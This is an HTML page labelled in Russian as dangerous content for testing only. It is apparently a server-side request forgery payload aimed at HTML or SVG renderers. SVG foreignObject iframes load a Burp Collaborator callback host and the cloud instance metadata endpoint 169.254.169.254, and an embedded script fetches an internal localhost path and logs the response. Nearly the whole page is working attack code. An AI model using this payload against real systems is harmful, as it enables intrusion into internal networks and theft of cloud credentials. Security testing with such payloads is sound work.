<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Опасный Веб-Сайт</title>
</head>
<body>
    <h1>Опасный контент - только для тестирования</h1>
    <svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      (function() {
        // Запрос к внутреннему ресурсу (например, список файлов)
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://localhost:8080/app/', true); // Замена на нужный внутренний путь
        xhr.onload = function() {
          if (xhr.status === 200) {
            // Преобразование полученного ответа
            var response = xhr.responseText;
            // Показать результат в консоли (можно попробовать другие методы)
            console.log(response);
          }
        };
        xhr.send();
      })();
   // ]]>
  </script>
</svg>
</body>
</html>
